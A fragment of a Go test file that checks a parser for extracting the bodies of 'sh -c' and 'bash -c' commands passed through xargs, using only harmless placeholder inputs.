	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bodies := shell.ExtractShellCBody(tt.input)
			if !reflect.DeepEqual(bodies, tt.bodies) {
				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
			}
		})
	}
}

func TestExtractXargsShellCBody(t *testing.T) {
	tests := []struct {
		name   string
		input  string
		bodies []string
	}{
		{
			name:   "simple xargs sh -c",
			input:  "xargs sh -c 'echo {}'",
			bodies: []string{"echo {}"},
		},
		{
			name:   "xargs with flags and bash -c",
			input:  "xargs -I{} bash -c 'process {}'",
			bodies: []string{"process {}"},
		},
		{
			name:   "no xargs pattern",
			input:  "sh -c 'echo hello'",
			bodies: nil,
		},
		{
			name:   "xargs with multiple sh -c",
			input:  "xargs sh -c 'safe' && xargs bash -c 'danger'",
			bodies: []string{"safe", "danger"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			bodies := shell.ExtractXargsShellCBody(tt.input)
			if !reflect.DeepEqual(bodies, tt.bodies) {
				t.Errorf("bodies: got %v, want %v", bodies, tt.bodies)
			}
		})
	}
}
